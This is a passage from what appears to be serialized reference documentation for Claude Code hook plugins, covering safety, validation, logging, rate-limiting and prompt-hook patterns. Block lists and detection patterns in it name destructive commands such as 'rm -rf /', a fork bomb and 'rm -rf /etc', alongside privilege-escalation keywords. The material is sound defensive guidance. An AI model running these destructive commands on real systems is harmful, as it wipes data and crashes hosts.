Protection\n\n### Overview\nAdd safety checks for destructive MCP operations.\n\n### Configuration\n```json\n{\n  \"PreToolUse\": [\n    {\n      \"matcher\": \"mcp__.*__delete.*\",\n      \"hooks\": [\n        {\n          \"type\": \"prompt\",\n          \"prompt\": \"Destructive MCP operation detected. Analyze: 1) Is deletion intentional and reversible? 2) Are there backups? 3) Does user have permission? 4) Is operation scope appropriate? Return 'allow' only if safe, or 'deny' with specific concerns.\"\n        }\n      ]\n    },\n    {\n      \"matcher\": \"mcp__.*__execute.*\",\n      \"hooks\": [\n        {\n          \"type\": \"prompt\",\n          \"prompt\": \"SQL execution detected. Check: 1) Operation type (SELECT/INSERT/UPDATE/DELETE) 2) Is it safe (no DROP, TRUNCATE)? 3) Are there WHERE clauses to limit scope? 4) Is user authorized? Return decision with explanation.\"\n        }\n      ]\n    }\n  ]\n}\n```\n\n### Matcher Patterns\n- `mcp__.*__delete.*` - All delete operations\n- `mcp__.*__drop.*` - Drop table/database operations\n- `mcp__.*__execute.*` - SQL execution\n- `mcp__plugin_name_.*` - Specific plugin's tools\n\n### Use Cases\n- Database safety (prevent accidental drops)\n- File system protection\n- API operations that modify data\n- Cost control (expensive operations)\n\n---\n\n## Pattern 5: Notification Logging\n\n### Overview\nLog all notifications for audit trail and analysis.\n\n### Configuration\n```json\n{\n  \"Notification\": [\n    {\n      \"matcher\": \"*\",\n      \"hooks\": [\n        {\n          \"type\": \"command\",\n          \"command\": \"bash ${CLAUDE_PLUGIN_ROOT}/scripts/log-notification.sh\"\n        }\n      ]\n    }\n  ]\n}\n```\n\n### Implementation (log-notification.sh)\n```bash\n#!/bin/bash\ninput=$(cat)\ntimestamp=$(date -Iseconds)\n\n# Parse notification type\nnotification_type=$(echo \"$input\" | jq -r '.notification_type // \"unknown\"')\n\n# Append to audit log\n{\n  echo \"$timestamp | $notification_type | $USER | Session: $SESSION_ID\"\n  echo \"$input\" | jq .\n  echo \"---\"\n} >> ~/.claude/notification-audit.log\n\n# Optionally send to external system\nif [ -n \"${SLACK_WEBHOOK:-}\" ]; then\n  curl -X POST \"$SLACK_WEBHOOK\" \\\n    -H 'Content-Type: application/json' \\\n    -d \"{\\\"text\\\": \\\"Claude notification: $notification_type\\\"}\" \\\n    2>/dev/null || true\nfi\n\nexit 0\n```\n\n### Use Cases\n- Audit compliance\n- Security monitoring\n- Performance analysis\n- User behavior tracking\n- Integration with external monitoring (Slack, email, etc.)\n\n---\n\n## Pattern 6: Build Verification\n\n### Overview\nEnsure projects build successfully after code changes.\n\n### Configuration\n```json\n{\n  \"Stop\": [\n    {\n      \"matcher\": \"*\",\n      \"hooks\": [\n        {\n          \"type\": \"prompt\",\n          \"prompt\": \"Check if code was modified (Write/Edit tools used). If yes: 1) Was the project built (npm run build, cargo build, mvn compile, etc)? 2) Did build succeed? 3) Are there build errors? If no build was run, block and request build. Return 'approve' only if build succeeded or no code was changed.\"\n        }\n      ]\n    }\n  ]\n}\n```\n\n### Detection Logic\nThe prompt-based hook can:\n- Parse transcript for build commands\n- Check for build success indicators\n- Detect error messages\n- Identify build tools used\n\n### Benefits\n- Prevents broken code commits\n- Enforces build discipline\n- Catches compilation errors early\n- Works across different build systems\n\n---\n\n## Pattern 7: Permission Confirmation\n\n### Overview\nAsk user to confirm potentially dangerous operations.\n\n### Configuration\n```json\n{\n  \"PreToolUse\": [\n    {\n      \"matcher\": \"Bash\",\n      \"hooks\": [\n        {\n          \"type\": \"prompt\",\n          \"prompt\": \"Analyze command. If it contains destructive keywords (rm, delete, drop, truncate, alter) OR system operations (chmod, chown, install, remove) OR privilege escalation (sudo, su), return 'ask' to request user confirmation. Otherwise return 'allow'.\"\n        }\n      ]\n    }\n  ]\n}\n```\n\n### How It Works\n1. Hook detects potentially dangerous operation\n2. Returns `permissionDecision: \"ask\"`\n3. Claude Code prompts user for confirmation\n4. User can approve or deny\n5. Operation proceeds or blocks\n\n### User Experience\n```\nClaude: I'm about to run: rm -rf node_modules/\nThis will delete the node_modules directory. Should I proceed?\n[Yes] [No]\n```\n\n### Use Cases\n- Destructive file operations\n- System modifications\n- Package installations\n- Database changes\n- Production deployments\n\n---\n\n## Pattern 8: Code Quality Checks\n\n### Overview\nRun linters and formatters on code edits automatically.\n\n### Configuration\n```json\n{\n  \"PostToolUse\": [\n    {\n      \"matcher\": \"Write|Edit\",\n      \"hooks\": [\n        {\n          \"type\": \"command\",\n          \"command\": \"bash ${CLAUDE_PLUGIN_ROOT}/scripts/check-quality.sh\"\n        }\n      ]\n    }\n  ]\n}\n```\n\n### Implementation (check-quality.sh)\n```bash\n#!/bin/bash\ninput=$(cat)\nfile_path=$(echo \"$input\" | jq -r '.tool_input.file_path')\n\n# Determine file type and run appropriate linter\ncase \"$file_path\" in\n  *.js|*.ts|*.jsx|*.tsx)\n    if command -v eslint &>/dev/null; then\n      echo \"Running ESLint on $file_path\"\n      npx eslint \"$file_path\" 2>&1 || true\n    fi\n    if command -v prettier &>/dev/null; then\n      echo \"Checking Prettier format\"\n      npx prettier --check \"$file_path\" 2>&1 || true\n    fi\n    ;;\n  *.py)\n    if command -v flake8 &>/dev/null; then\n      echo \"Running flake8 on $file_path\"\n      flake8 \"$file_path\" 2>&1 || true\n    fi\n    if command -v black &>/dev/null; then\n      echo \"Checking black format\"\n      black --check \"$file_path\" 2>&1 || true\n    fi\n    ;;\n  *.rs)\n    if command -v rustfmt &>/dev/null; then\n      echo \"Running rustfmt on $file_path\"\n      rustfmt --check \"$file_path\" 2>&1 || true\n    fi\n    ;;\nesac\n\nexit 0\n```\n\n### Benefits\n- Immediate feedback on code quality\n- Consistent code formatting\n- Early error detection\n- Works across different languages\n\n---\n\n## Pattern 9: Test Enforcement\n\n### Overview\nEnsure tests run after code changes.\n\n### Configuration\n```json\n{\n  \"Stop\": [\n    {\n      \"matcher\": \"*\",\n      \"hooks\": [\n        {\n          \"type\": \"prompt\",\n          \"prompt\": \"Review transcript. If code was modified (Write/Edit tools used), verify: 1) Were tests executed? 2) Did all tests pass? 3) Is test coverage adequate? If tests weren't run, block and request test execution. Return 'approve' only if tests passed or no code changed.\"\n        }\n      ]\n    }\n  ]\n}\n```\n\n### Detection\nThe prompt analyzes transcript for:\n- Test commands (npm test, cargo test, pytest, etc.)\n- Test results (passed/failed)\n- Coverage reports\n- Test file modifications\n\n### Benefits\n- Prevents code without tests\n- Enforces quality standards\n- Reduces bugs in production\n- Works with any testing framework\n\n---\n\n## Pattern 10: Configuration-Driven Hooks\n\n### Overview\nMake hook behavior configurable via JSON files.\n\n### Configuration\n```json\n{\n  \"PreToolUse\": [\n    {\n      \"matcher\": \"Write|Edit\",\n      \"hooks\": [\n        {\n          \"type\": \"command\",\n          \"command\": \"bash ${CLAUDE_PLUGIN_ROOT}/scripts/configurable-validate.sh\"\n        }\n      ]\n    }\n  ]\n}\n```\n\n### Implementation (configurable-validate.sh)\n```bash\n#!/bin/bash\ninput=$(cat)\nfile_path=$(echo \"$input\" | jq -r '.tool_input.file_path')\n\n# Read configuration\nCONFIG_FILE=\"$CLAUDE_PROJECT_DIR/.claude/security-policy.json\"\n\nif [ -f \"$CONFIG_FILE\" ]; then\n  # Load configuration\n  allowed_paths=$(jq -r '.allowedPaths[]?' \"$CONFIG_FILE\")\n  forbidden_paths=$(jq -r '.forbiddenPaths[]?' \"$CONFIG_FILE\")\n  max_file_size=$(jq -r '.maxFileSize // 1000000' \"$CONFIG_FILE\")\n  strict_mode=$(jq -r '.strictMode // false' \"$CONFIG_FILE\")\n\n  # Check allowed paths\n  if [ -n \"$allowed_paths\" ]; then\n    path_allowed=false\n    while IFS= read -r path; do\n      if [[ \"$file_path\" == \"$path\"* ]]; then\n        path_allowed=true\n        break\n      fi\n    done <<< \"$allowed_paths\"\n\n    if [ \"$path_allowed\" = false ]; then\n      echo \"{\\\"continue\\\": true, \\\"systemMessage\\\": \\\"Path not in allowed list: $file_path\\\"}\" >&2\n      exit 2\n    fi\n  fi\n\n  # Check forbidden paths\n  if [ -n \"$forbidden_paths\" ]; then\n    while IFS= read -r path; do\n      if [[ \"$file_path\" == \"$path\"* ]]; then\n        echo \"{\\\"continue\\\": true, \\\"systemMessage\\\": \\\"Path in forbidden list: $file_path\\\"}\" >&2\n        exit 2\n      fi\n    done <<< \"$forbidden_paths\"\n  fi\nfi\n\nexit 0\n```\n\n### Configuration File (.claude/security-policy.json)\n```json\n{\n  \"strictMode\": true,\n  \"allowedPaths\": [\"/tmp\", \"/home/user/projects\"],\n  \"forbiddenPaths\": [\"/etc\", \"/sys\"],\n  \"maxFileSize\": 500000,\n  \"requireTests\": true,\n  \"blockDeleteOperations\": true\n}\n```\n\n### Use Cases\n- Team-specific policies\n- Project-specific settings\n- Environment-based configuration\n- Gradual security rollout\n\n---\n\n## Pattern 11: Temporary Hook Activation\n\n### Overview\nEnable hooks conditionally via flag files.\n\n### Configuration\n```json\n{\n  \"PreToolUse\": [\n    {\n      \"matcher\": \"Write|Edit\",\n      \"hooks\": [\n        {\n          \"type\": \"command\",\n          \"command\": \"bash ${CLAUDE_PLUGIN_ROOT}/scripts/conditional-validate.sh\"\n        }\n      ]\n    }\n  ]\n}\n```\n\n### Implementation (conditional-validate.sh)\n```bash\n#!/bin/bash\ninput=$(cat)\nfile_path=$(echo \"$input\" | jq -r '.tool_input.file_path')\n\n# Check for flag files\nSTRICT_MODE_FILE=\"$CLAUDE_PROJECT_DIR/.enable-strict-validation\"\nSECURITY_SCAN_FILE=\"$CLAUDE_PROJECT_DIR/.enable-security-scan\"\nDEBUG_MODE_FILE=\"$CLAUDE_PROJECT_DIR/.enable-debug-hooks\"\n\n# Skip if no flags set\nif [ ! -f \"$STRICT_MODE_FILE\" ] && [ ! -f \"$SECURITY_SCAN_FILE\" ]; then\n  exit 0\nfi\n\n# Run strict validation if enabled\nif [ -f \"$STRICT_MODE_FILE\" ]; then\n  # Strict mode: more checks\n  if [[ \"$file_path\" == *\".env\"* ]]; then\n    echo \"{\\\"continue\\\": true, \\\"systemMessage\\\": \\\"Environment file in strict mode requires review\\\"}\" >&2\n    exit 2\n  fi\n\n  if [ -f \"$DEBUG_MODE_FILE\" ]; then\n    echo \"Debug: Validating $file_path in strict mode\" >&2\n  fi\nfi\n\n# Run security scan if enabled\nif [ -f \"$SECURITY_SCAN_FILE\" ]; then\n  # Security scan: check for secrets\n  file_content=$(echo \"$input\" | jq -r '.tool_input.content // empty')\n\n  if echo \"$file_content\" | grep -qiE \"(password|secret|key).{0,20}['\\\"]?[A-Za-z0-9]{20,}\"; then\n    echo \"{\\\"continue\\\": true, \\\"systemMessage\\\": \\\"Potential secret detected in file content\\\"}\" >&2\n    exit 2\n  fi\nfi\n\nexit 0\n```\n\n### Activation Commands\n```bash\n# Enable strict mode\ntouch .enable-strict-validation\n\n# Enable security scanning\ntouch .enable-security-scan\n\n# Enable debug logging\ntouch .enable-debug-hooks\n\n# Disable all\nrm -f .enable-*\n```\n\n### Benefits\n- Temporary validation for sensitive operations\n- Development vs production settings\n- Feature flags for hook behavior\n- Performance optimization (disable heavy hooks)\n\n### Note\nFlag file changes require Claude Code restart to take effect.\n\n---\n\n## Pattern 12: Hybrid Validation (Command + Prompt)\n\n### Overview\nCombine fast command checks with intelligent prompt analysis.\n\n### Configuration\n```json\n{\n  \"PreToolUse\": [\n    {\n      \"matcher\": \"Bash\",\n      \"hooks\": [\n        {\n          \"type\": \"command\",\n          \"command\": \"bash ${CLAUDE_PLUGIN_ROOT}/scripts/quick-check.sh\",\n          \"timeout\": 5\n        },\n        {\n          \"type\": \"prompt\",\n          \"prompt\": \"Analyze bash command: $TOOL_INPUT.command. Check for: 1) Hidden destructive operations 2) Command substitution with user input 3) Complex logic that needs review 4) Intent vs literal meaning. Return decision with explanation.\",\n          \"timeout\": 15\n        }\n      ]\n    }\n  ]\n}\n```\n\n### Implementation (quick-check.sh)\n```bash\n#!/bin/bash\ninput=$(cat)\ncommand=$(echo \"$input\" | jq -r '.tool_input.command // empty')\n\n# Fast path: immediately approve obviously safe commands\nif [[ \"$command\" =~ ^(ls|pwd|echo|date|whoami|cat)$ ]]; then\n  exit 0\nfi\n\n# Fast path: immediately block extremely dangerous commands\nif [[ \"$command\" == *\"rm -rf /\"* ]] || [[ \"$command\" == *\":(){ :|:& };:\"* ]]; then\n  echo '{\"continue\": true, \"systemMessage\": \"Dangerous operation detected\"}' >&2\n  exit 2\nfi\n\n# Let prompt hook handle everything else\nexit 0\n```\n\n### Benefits\n- **Fast**: Command hook handles obvious cases instantly\n- **Smart**: Prompt hook analyzes complex scenarios\n- **Parallel**: Both hooks run simultaneously\n- **Resilient**: Command hook provides basic safety net\n\n### Performance\n- Obvious safe commands: < 10ms\n- Obvious dangerous commands: < 10ms\n- Complex commands: Command + Prompt (parallel, ~15s total)\n\n---\n\n## Pattern 13: Rate Limiting\n\n### Overview\nPrevent abuse by limiting operations per time window.\n\n### Configuration\n```json\n{\n  \"PreToolUse\": [\n    {\n      \"matcher\": \"Bash\",\n      \"hooks\": [\n        {\n          \"type\": \"command\",\n          \"command\": \"bash ${CLAUDE_PLUGIN_ROOT}/scripts/rate-limit.sh\"\n        }\n      ]\n    }\n  ]\n}\n```\n\n### Implementation (rate-limit.sh)\n```bash\n#!/bin/bash\ninput=$(cat)\ncommand=$(echo \"$input\" | jq -r '.tool_input.command // empty')\nsession_id=$(echo \"$input\" | jq -r '.session_id // \"default\"')\n\n# Rate limit configuration\nRATE_LIMIT_DIR=\"/tmp/claude-rate-limits\"\nmkdir -p \"$RATE_LIMIT_DIR\"\n\nrate_file=\"$RATE_LIMIT_DIR/$session_id\"\ncurrent_minute=$(date +%Y%m%d%H%M)\n\n# Read or initialize rate limit\nif [ -f \"$rate_file\" ]; then\n  last_minute=$(head -1 \"$rate_file\" 2>/dev/null || echo \"\")\n  count=$(tail -1 \"$rate_file\" 2>/dev/null || echo \"0\")\n\n  if [ \"$current_minute\" = \"$last_minute\" ]; then\n    # Same minute, check limit\n    limit=50  # 50 operations per minute\n\n    if [ \"$count\" -gt \"$limit\" ]; then\n      echo '{\"continue\": true, \"systemMessage\": \"Rate limit exceeded. Please wait before continuing.\"}' >&2\n      exit 2\n    fi\n\n    count=$((count + 1))\n  else\n    # New minute, reset counter\n    count=1\n  fi\nelse\n  # New session\n  count=1\nfi\n\n# Write updated count\n{\n  echo \"$current_minute\"\n  echo \"$count\"\n} > \"$rate_file\"\n\nexit 0\n```\n\n### Configuration Options\n- Per-user rate limits\n- Per-operation-type limits\n- Different limits for different tools\n- Sliding window vs fixed window\n- Whitelisted operations\n\n### Use Cases\n- Prevent resource abuse\n- Cost control for paid APIs\n- Security (prevent DoS)\n- Team usage policies\n\n---\n\n## Pattern 14: Context Injection (PreCompact)\n\n### Overview\nAdd critical context before compaction to preserve important information.\n\n### Configuration\n```json\n{\n  \"PreCompact\": [\n    {\n      \"matcher\": \"*\",\n      \"hooks\": [\n        {\n          \"type\": \"prompt\",\n          \"prompt\": \"Summarize key context from transcript at $TRANSCRIPT_PATH. Preserve: 1) Current task status 2) Important decisions made 3) Open questions 4) Next steps 5) Relevant file paths. Return concise summary for preservation.\"\n        }\n      ]\n    }\n  ]\n}\n```\n\n### What Gets Preserved\n- Task progress\n- User requirements\n- Important context\n- Decisions made\n- Open issues\n\n### Benefits\n- Prevents context loss during compaction\n- Maintains session continuity\n- Preserves important decisions\n- Keeps track of progress\n\n---\n\n## Pattern 15: User Prompt Validation\n\n### Overview\nAnalyze user prompts for security issues or provide guidance.\n\n### Configuration\n```json\n{\n  \"UserPromptSubmit\": [\n    {\n      \"matcher\": \"*\",\n      \"hooks\": [\n        {\n          \"type\": \"prompt\",\n          \"prompt\": \"Analyze user prompt: $USER_PROMPT. If discussing: 1) API keys or credentials - provide security guidance 2) Production deployments - suggest caution 3) Database operations - recommend backups 4) Deletions - recommend verification. Provide helpful guidance.\"\n        }\n      ]\n    }\n  ]\n}\n```\n\n### How It Works\n1. User types prompt\n2. Hook analyzes content\n3. Provides relevant guidance\n4. Guidance shown before processing\n\n### Example Output\n```\nSecurity Guidance: I notice you're working with API keys. Remember to:\n- Use environment variables, not hardcoded values\n- Rotate keys regularly\n- Never commit keys to version control\n- Use least-privilege access\n```\n\n### Use Cases\n- Security education\n- Best practice reminders\n- Risk awareness\n- Policy enforcement\n\n---\n\n## Choosing the Right Pattern\n\n### Decision Matrix\n\n| Use Case | Best Pattern | Why |\n|----------|--------------|-----|\n| Security validation | Pattern 1: Security Validation | Prompt hooks adapt to new threats |\n| Quality gates | Pattern 2: Quality Enforcement | Stop hook prevents incomplete work |\n| Project setup | Pattern 3: Context Loading | Automatic detection |\n| Data protection | Pattern 4: MCP Protection | Prevents destructive operations |\n| Audit trail | Pattern 5: Notification Logging | Compliance and monitoring |\n| Build checking | Pattern 6: Build Verification | Prevents broken code |\n| User confirmation | Pattern 7: Permission Confirmation | Interactive safety |\n| Code quality | Pattern 8: Code Quality Checks | Automatic linting |\n| Testing | Pattern 9: Test Enforcement | Ensures test coverage |\n| Configurable | Pattern 10: Configuration-Driven | Flexible policies |\n| Temporary checks | Pattern 11: Temporary Activation | On-demand validation |\n| Speed + intelligence | Pattern 12: Hybrid Validation | Best of both worlds |\n| Abuse prevention | Pattern 13: Rate Limiting | Resource protection |\n| Context preservation | Pattern 14: Context Injection | Maintains continuity |\n| User guidance | Pattern 15: User Prompt Validation | Proactive assistance |\n\n### Pattern Combinations\n\nCommon combinations:\n\n**Security-Focused Plugin:**\n- Pattern 1: Security Validation\n- Pattern 4: MCP Protection\n- Pattern 7: Permission Confirmation\n- Pattern 13: Rate Limiting\n\n**Quality-Focused Plugin:**\n- Pattern 2: Quality Enforcement\n- Pattern 6: Build Verification\n- Pattern 8: Code Quality Checks\n- Pattern 9: Test Enforcement\n\n**Developer Experience Plugin:**\n- Pattern 3: Context Loading\n- Pattern 5: Notification Logging\n- Pattern 10: Configuration-Driven\n- Pattern 15: User Prompt Validation\n\n---\n\n## Best Practices Summary\n\n### For All Patterns\n\n### DO:**\n- Use prompt hooks for complex logic\n- Use command hooks for fast checks\n- Combine patterns for layered validation\n- Test hooks before deployment\n- Document hook behavior\n- Provide clear error messages\n- Use appropriate timeouts\n- Validate all inputs\n\n### DON'T:**\n- Create hooks that block everything\n- Skip error handling\n- Log sensitive information\n- Create slow hooks\n- Ignore user feedback\n- Rely on hook execution order\n- Use hardcoded paths\n\n### Testing Hooks\n\nAlways test hooks:\n\n1. **Unit test scripts**\n   ```bash\n   ./scripts/test-hook.sh scripts/validate-write.sh test-input.json\n   ```\n\n2. **Validate configuration**\n   ```bash\n   ./scripts/validate-hook-schema.sh hooks/hooks.json\n   ```\n\n3. **Lint scripts**\n   ```bash\n   ./scripts/hook-linter.sh scripts/*.sh\n   ```\n\n4. **Test in Claude Code**\n   ```bash\n   claude --debug\n   ```\n\n### Documentation\n\nDocument your patterns:\n- Explain what each hook does\n- Provide configuration examples\n- Document configuration options\n- List dependencies\n- Include troubleshooting guide\n\n---\n\n## Conclusion\n\nThese patterns provide a solid foundation for hook development. Choose patterns based on your needs, combine them for layered protection, and always test thoroughly. Remember: hooks are powerful tools that should enhance user experience, not obstruct it.",
        "plugins/sys-core/skills/managing-hooks/references/performance.md": "# Performance Optimization\n\n## Timeout Guidelines\n\n| Operation Type | Timeout | Examples |\n|---------------|---------|----------|\n| **Fast** | 5-10s | File existence checks, simple regex |\n| **Standard** | 30s | Git operations, linting, formatting |\n| **Complex** | 60s | Build processes, large file operations |\n\n## Optimization Strategies\n\n### 1. Minimize Hook Execution\n\n- Use matchers to filter specific tools only\n- Avoid wildcard matchers when possible\n- Cache expensive operations\n\n### 2. Fast File Operations\n\n```bash\n# Fast existence check\n[ -f \"$file_path\" ] && echo \"exists\" || echo \"missing\"\n\n# Use test operators\n[ -r \"$file_path\" ] && [ -w \"$file_path\" ] && echo \"readable and writable\"\n```\n\n### 3. Parallel Execution\n\nHooks run in parallel. Design them to be independent:\n\n```json\n{\n  \"matcher\": \"Write\",\n  \"hooks\": [\n    {\n      \"type\": \"command\",\n      \"command\": \"bash ${CLAUDE_PLUGIN_ROOT}/scripts/check1.sh\",\n      \"timeout\": 10\n    },\n    {\n      \"type\": \"command\",\n      \"command\": \"bash ${CLAUDE_PLUGIN_ROOT}/scripts/check2.sh\",\n      \"timeout\": 10\n    }\n  ]\n}\n```\n\nBoth checks run simultaneously.\n\n### 4. Caching\n\nFor expensive operations, cache results:\n\n```bash\ncache_file=\"/tmp/hook_cache_$(echo \"$1\" | md5sum | cut -d' ' -f1)\"\n\nif [ -f \"$cache_file\" ] && [ $(find \"$cache_file\" -mtime -1 2>/dev/null) ]; then\n  cat \"$cache_file\"\n  exit 0\nfi\n\n# Expensive operation\nresult=$(expensive_operation)\n\n# Cache result\necho \"$result\" > \"$cache_file\"\necho \"$result\"\n```\n\n## Common Performance Issues\n\n### Issue: Slow File I/O\n\n**Solution:** Use efficient tools\n\n```bash\n# Slow\ncat large_file.txt | grep pattern\n\n# Fast\ngrep pattern large_file.txt\n```\n\n### Issue: Too Many Hooks\n\n**Solution:** Consolidate checks\n\n```json\n{\n  \"hooks\": [\n    {\n      \"type\": \"command\",\n      \"command\": \"bash ${CLAUDE_PLUGIN_ROOT}/scripts/comprehensive_check.sh\",\n      \"timeout\": 30\n    }\n  ]\n}\n```\n\n### Issue: Long External Tool Calls\n\n**Solution:** Add timeouts and fallbacks\n\n```bash\n# With timeout\ntimeout 30s expensive_operation || {\n  echo \"Operation timed out\" >&2\n  exit 124\n}\n\n# Background processing\nexpensive_operation &\nPID=$!\nsleep 30 && kill $PID 2>/dev/null\nwait $PID\n```\n\n## Performance Monitoring\n\n### Measure Execution Time\n\n```bash\nstart=$(date +%s.%N)\n# ... operation ...\nend=$(date +%s.%N)\nduration=$(echo \"$end - $start\" | bc)\necho \"Execution time: ${duration}s\"\n```\n\n### Log Performance Metrics\n\n```bash\n{\n  \"continue\": true,\n  \"systemMessage\": \"Hook executed in ${duration}ms\"\n}\n```\n\n## Best Practices Summary\n\n1. **Set realistic timeouts**\n2. **Filter hooks with precise matchers**\n3. **Cache expensive operations**\n4. **Use parallel execution when possible**\n5. **Optimize file operations**\n6. **Monitor and log performance**\n7. **Test with realistic data**\n8. **Profile slow operations**\n9. **Use background tasks for long operations**\n10. **Implement exponential backoff for retries**\n",
        "plugins/sys-core/skills/managing-hooks/references/prompt-hooks.md": "# Prompt-Based Hooks\n\n## Overview\n\nPrompt hooks use an LLM (typically Haiku) to evaluate actions and return structured JSON decisions. They enable complex, context-aware validation that rule-based scripts cannot handle.\n\n## When to Use Prompt Hooks\n\n**Use Prompt Hooks for:**\n- Semantic understanding of intent\n- Complex context evaluation\n- Nuanced decision making\n- Content filtering requiring comprehension\n\n**Use Command Hooks for:**\n- Simple pattern matching\n- Fast rule-based validation\n- Security checks with clear rules\n- Dependency verification\n\n## JSON Response Protocol\n\n### Success (Continue Action)\n\n```json\n{\n  \"ok\": true\n}\n```\n\n**Behavior:** Action continues normally\n\n### Block (Stop Action)\n\n```json\n{\n  \"ok\": false,\n  \"reason\": \"This action would modify system files\"\n}\n```\n\n**Behavior:** Action is blocked, reason shown to user\n\n## Configuration\n\n### Basic Prompt Hook\n\n```json\n{\n  \"hooks\": {\n    \"PreToolUse\": [\n      {\n        \"hooks\": [\n          {\n            \"type\": \"prompt\",\n            \"prompt\": \"Check if action is safe: $ARGUMENTS. Return JSON with ok field.\",\n            \"timeout\": 30\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n### Advanced Prompt Hook\n\n```json\n{\n  \"hooks\": {\n    \"UserPromptSubmit\": [\n      {\n        \"hooks\": [\n          {\n            \"type\": \"prompt\",\n            \"prompt\": \"Evaluate user input for safety:\\n\\n$ARGUMENTS\\n\\nReturn JSON with ok field. If malicious, set ok to false and include reason field explaining the issue.\",\n            \"timeout\": 30\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n## Prompt Design Patterns\n\n### Safety Validation Pattern\n\n```json\n{\n  \"type\": \"prompt\",\n  \"prompt\": \"You are a safety validator. Check if this action is safe:\\n\\nContext: $TOOL_NAME\\nArguments: $ARGUMENTS\\n\\nReturn JSON: {\\\"ok\\\": true|false, \\\"reason\\\": \\\"explanation\\\"}\",\n  \"timeout\": 30\n}\n```\n\n### Content Filter Pattern\n\n```json\n{\n  \"type\": \"prompt\",\n  \"prompt\": \"Filter this user input for harmful content:\\n\\n$ARGUMENTS\\n\\nReturn JSON: {\\\"ok\\\": true|false, \\\"reason\\\": \\\"if blocked\\\"}\",\n  \"timeout\": 30\n}\n```\n\n### Permission Check Pattern\n\n```json\n{\n  \"type\": \"prompt\",\n  \"prompt\": \"Check if this operation requires elevated permissions:\\n\\nOperation: $TOOL_NAME\\nArguments: $ARGUMENTS\\n\\nReturn JSON: {\\\"ok\\\": true|false, \\\"reason\\\": \\\"why blocked\\\", \\\"suggestion\\\": \\\"alternative approach\\\"}\",\n  \"timeout\": 30\n}\n```\n\n## Available Variables in Prompt Hooks\n\n| Variable | Description | Example |\n|:----------|:-------------|:--------|\n| `$ARGUMENTS` | Tool arguments as JSON | `{\"file_path\": \"/path/to/file\"}` |\n| `$TOOL_NAME` | Name of tool being invoked | `Write`, `Bash`, `Read` |\n| `$CLAUDE_PROJECT_DIR` | Project directory | `/Users/user/project` |\n\n## Event Support\n\nPrompt hooks work with these events:\n\n| Event | Use Case |\n|:------|:---------|\n| `Stop` | Final validation of results |\n| `SubagentStop` | Subagent result validation |\n| `UserPromptSubmit` | Input validation and filtering |\n| `PreToolUse` | Semantic safety checks |\n| `PermissionRequest` | Intelligent permission decisions |\n\n## Examples\n\n### Semantic Safety Check\n\n**Scenario:** Block operations that seem malicious even if they don't match explicit patterns.\n\n```json\n{\n  \"hooks\": {\n    \"PreToolUse\": [\n      {\n        \"matcher\": \"Bash\",\n        \"hooks\": [\n          {\n            \"type\": \"prompt\",\n            \"prompt\": \"Evaluate if this bash command is safe:\\n\\nCommand: $ARGUMENTS\\n\\nConsider:\\n- Does it attempt to access sensitive files?\\n- Does it try to escalate privileges?\\n- Does it attempt to exfiltrate data?\\n\\nReturn JSON: {\\\"ok\\\": true|false, \\\"reason\\\": \\\"explanation if blocked\\\"}\",\n            \"timeout\": 30\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n### Content Filtering\n\n**Scenario:** Filter user input for harmful content.\n\n```json\n{\n  \"hooks\": {\n    \"UserPromptSubmit\": [\n      {\n        \"hooks\": [\n          {\n            \"type\": \"prompt\",\n            \"prompt\": \"Evaluate this user input for harmful content:\\n\\n$ARGUMENTS\\n\\nCheck for:\\n- Hate speech\\n- Dangerous instructions\\n- Sexual content\\n- Harassment\\n\\nReturn JSON: {\\\"ok\\\": true|false, \\\"reason\\\": \\\"why blocked\\\"}\",\n            \"timeout\": 30\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n### Intelligent Permission Decision\n\n**Scenario:** Auto-allow safe operations, prompt for risky ones.\n\n```json\n{\n  \"hooks\": {\n    \"PermissionRequest\": [\n      {\n        \"hooks\": [\n          {\n            \"type\": \"prompt\",\n            \"prompt\": \"Evaluate if this permission request should be auto-allowed:\\n\\nTool: $TOOL_NAME\\nContext: $ARGUMENTS\\n\\nAuto-allow if:\\n- Read operations in project directory\\n- Write operations to non-system files\\n\\nRequire prompt if:\\n- Operations outside project\\n- System file modifications\\n\\nReturn JSON: {\\\"ok\\\": true|false, \\\"reason\\\": \\\"explanation\\\"}\",\n            \"timeout\": 30\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n### Result Validation\n\n**Scenario:** Validate agent outputs before completion.\n\n```json\n{\n  \"hooks\": {\n    \"Stop\": [\n      {\n        \"hooks\": [\n          {\n            \"type\": \"prompt\",\n            \"prompt\": \"Validate the agent's final result:\\n\\nContext: $ARGUMENTS\\n\\nCheck:\\n- Results match the original request\\n- No harmful content generated\\n- No security issues introduced\\n\\nReturn JSON: {\\\"ok\\\": true|false, \\\"reason\\\": \\\"issues found\\\"}\",\n            \"timeout\": 30\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n## Prompt Best Practices\n\n### 1. Clear Instructions\n\n```json\n{\n  \"prompt\": \"Check if action is safe: $ARGUMENTS. Return JSON with ok field.\"\n}\n```\n\n**Good:** Clear, specific instructions\n\n### 2. Structured Output\n\n```json\n{\n  \"prompt\": \"Return JSON: {\\\"ok\\\": true|false, \\\"reason\\\": \\\"explanation\\\", \\\"suggestion\\\": \\\"alternative\\\"}\"\n}\n```\n\n**Good:** Defines exact JSON structure expected\n\n### 3. Context Provision\n\n```json\n{\n  \"prompt\": \"Tool: $TOOL_NAME\\nArguments: $ARGUMENTS\\nProject: $CLAUDE_PROJECT_DIR\\n\\nEvaluate safety...\"\n}\n```\n\n**Good:** Provides full context for evaluation\n\n### 4. Examples in Prompt\n\n```json\n{\n  \"prompt\": \"Evaluate safety:\\n\\n$ARGUMENTS\\n\\nExamples:\\nSafe: ls -la\\nUnsafe: rm -rf /etc\\n\\nReturn JSON: {\\\"ok\\\": true|false}\"\n}\n```\n\n**Good:** Few-shot examples improve accuracy\n\n## Performance Considerations\n\n| Factor | Impact |\n|:-------|:--------|\n| **Prompt length** | Longer prompts = slower evaluation |\n| **Timeout** | Longer timeout allows complex evaluation |\n| **LLM model** | Haiku is fast, less capable; larger models slower |\n| **Frequency** | Prompt hooks on every tool call = significant overhead |\n\n**Best Practice:** Use prompt hooks sparingly. Prefer command hooks for fast, rule-based checks.\n\n## Cost Analysis\n\n| Hook Type | Token Cost | Speed | Complexity |\n|:----------|:----------:|:-----:|:----------:|\n| Command | 0 tokens | Fast | Simple rules only |\n| Prompt | ~500-2000 tokens | Slow | 